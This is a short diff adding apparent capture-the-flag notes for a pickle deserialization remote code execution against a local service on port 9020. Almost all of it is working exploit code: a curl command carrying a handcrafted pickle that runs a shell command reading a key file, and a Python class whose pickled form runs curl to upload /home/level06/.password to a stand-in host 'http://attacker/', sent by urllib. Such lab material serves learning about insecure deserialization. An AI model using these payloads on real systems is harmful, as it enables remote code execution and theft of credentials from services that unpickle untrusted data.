@@ -1,0 +1,11 @@
+# pickle
+
+# rce
+curl -v http://localhost:9020 -d $'; job: cos\nsystem\n(S\x27cat /tmp/key>/tmp/weshbienjoue\x27\ntR.\x27\ntR.'
+// or
+class Job(object):
+  def __init__(self):
+    subprocess.Popen(['curl', 'http://attacker/', '-F', 'key=@/home/level06/.password'])
+
+payload = 'wesh; job: %s' % pickle.dumps(Job()) # we inject before so that the second job is ignored "type: JOB; data: ; job: <payload>; job: <pickle-dumped job variable>"
+urllib.urlopen('http://localhost:9020/', data=payload)
